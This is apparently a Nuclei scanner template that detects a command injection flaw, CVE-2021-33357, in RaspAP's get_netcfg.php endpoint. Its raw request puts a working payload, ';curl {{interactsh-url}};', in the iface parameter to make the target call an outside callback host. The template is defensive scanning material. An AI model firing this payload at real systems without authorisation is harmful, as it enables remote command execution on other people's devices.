id: CVE-2021-33357
info:
  name: RaspAP get_netcfg.php Command Injection
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    RaspAP versions 2.6 to 2.6.5 are vulnerable to command injection via the `iface` parameter in the `get_netcfg.php` endpoint. This allows attackers to execute arbitrary commands on the operating system.
  classification:
    cve-id: CVE-2021-33357
    cvss-metrics: "3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
    cvss-score: 9.8
  tags: command-injection
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2021-33357

http:
  - raw:
      - |
        GET /ajax/networking/get_netcfg.php?iface=;curl%20{{interactsh-url}}; HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
      - type: word
        part: header
        words:
          - "text/html"
